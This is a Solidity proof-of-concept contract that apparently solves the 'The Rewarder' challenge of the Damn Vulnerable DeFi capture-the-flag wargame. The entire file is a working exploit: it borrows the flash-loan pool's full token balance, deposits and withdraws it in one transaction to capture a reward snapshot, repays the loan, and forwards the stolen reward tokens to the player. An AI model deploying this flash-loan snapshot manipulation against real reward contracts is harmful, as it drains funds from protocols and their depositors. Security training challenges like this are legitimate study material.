// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract Reward_POC {
    TheRewarderPool public reward_pool;
    FlashLoanerPool public flashloan_pool;
    DamnValuableToken public liquidly_token;
    RewardToken public reward_token;
    address public player;

    constructor(FlashLoanerPool _flash_loan, TheRewarderPool _rewrd_pool, DamnValuableToken _liquidly_token, RewardToken _reward_token) {
        player = msg.sender;
        flashloan_pool = _flash_loan;
        reward_pool = _rewrd_pool;
        liquidly_token = _liquidly_token;
        reward_token = _reward_token;
    }

    function exploit() external {
        flashloan_pool.flashLoan(liquidly_token.balanceOf(address(flashloan_pool)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        require(tx.origin == player);

        liquidly_token.approve(address(reward_pool), _amount);
        
        reward_pool.deposit(_amount);
        reward_pool.withdraw(_amount);

        liquidly_token.transfer(address(flashloan_pool), _amount);

        reward_token.transfer(player, reward_token.balanceOf(address(this)));
    }
}

